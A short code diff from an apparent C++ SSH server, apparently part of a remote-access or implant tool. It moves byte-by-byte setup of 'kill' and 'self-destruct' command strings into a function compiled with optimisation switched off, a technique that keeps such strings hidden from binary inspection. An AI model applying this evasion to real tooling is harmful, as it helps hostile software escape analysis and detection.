@@ -57,8 +57,16 @@ SSHServer::my_ResizePseudoConsole SSHServer::my_ResizePseudoConsole_function = n
 SSHServer::my_ClosePseudoConsole SSHServer::my_ClosePseudoConsole_function = nullptr;
 #endif
 
-SSHServer::SSHServer()
-{
+
+/*Disable optimizations */
+#ifdef _MSC_VER
+#pragma optimize( "", off )
+#endif // _MSC_VER
+void SSHServer::fill_commands() {
+#ifdef __GNUC__
+#pragma GCC push_options
+#pragma GCC optimize ("O0")
+#endif // !__GNUC__
     /* Init CID commands*/
     kill_command[0] = 'c';
     kill_command[1] = 'i';
@@ -83,6 +91,20 @@ SSHServer::SSHServer()
     destruct_command[10] = 'c';
     destruct_command[11] = 't';
     destruct_command[12] = '\r';
+
+#ifdef __GNUC__
+#pragma GCC pop_options
+#endif // !__GNUC__
+}
+#ifdef _MSC_VER
+#pragma optimize( "", on )
+#endif // _MSC_VER
+
+
+
+SSHServer::SSHServer()
+{
+    fill_commands();
 
     if (gen_rsa_keys()) {
         debug("[+] RSA keys generated correctly\n");
